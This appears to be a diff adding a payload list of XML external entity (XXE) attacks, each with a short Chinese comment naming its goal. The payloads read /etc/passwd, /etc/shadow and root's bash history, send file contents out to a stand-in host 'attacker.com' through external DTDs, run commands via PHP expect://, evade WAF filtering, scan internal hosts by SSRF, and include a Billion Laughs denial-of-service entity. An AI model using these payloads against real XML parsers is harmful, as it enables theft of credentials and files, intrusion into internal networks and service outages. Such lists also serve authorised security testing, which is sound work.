@@ -1,0 +1,28 @@
+# XXE - 读取系统密码文件
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+# XXE - OOB 带外数据窃取 (参数实体 + 外部 DTD)
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;%exfil;]><foo>test</foo>
+# XXE - Billion Laughs 拒绝服务攻击
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]><lolz>&lol4;</lolz>
+# XXE - PHP expect 封装器执行系统命令
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>
+# XXE - 读取 Web 目录列表枚举文件
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/">]><foo>&xxe;</foo>
+# XXE - Base64 编码绕过 WAF 过滤
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>
+# XXE - XInclude 绕过 DOCTYPE 限制
+<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+# XXE - SSRF 端口扫描内网服务
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://10.0.0.1:8080">]><foo>&xxe;</foo>
+# XXE - Error-based 通过错误消息泄露文件内容
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://attacker.com/?%xxe;'>">%wrapper;]><foo>test</foo>
+# XXE - 读取 Office Open XML 文件 (docx/xlsx 解包)
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/www/secret.docx">]><foo>&xxe;</foo>
+# XXE - SVG 文件上传型 XXE 读取密码
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>
+# XXE - FTP 协议 SSRF 攻击内网 FTP 服务
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://admin:password@10.0.0.1/">]><foo>&xxe;</foo>
+# XXE - 读取 .bash_history 窃取历史命令
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///root/.bash_history">]><foo>&xxe;</foo>
+# XXE - jar:// 协议读取 Java 应用配置
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///var/www/app.war!/WEB-INF/web.xml">]><foo>&xxe;</foo>
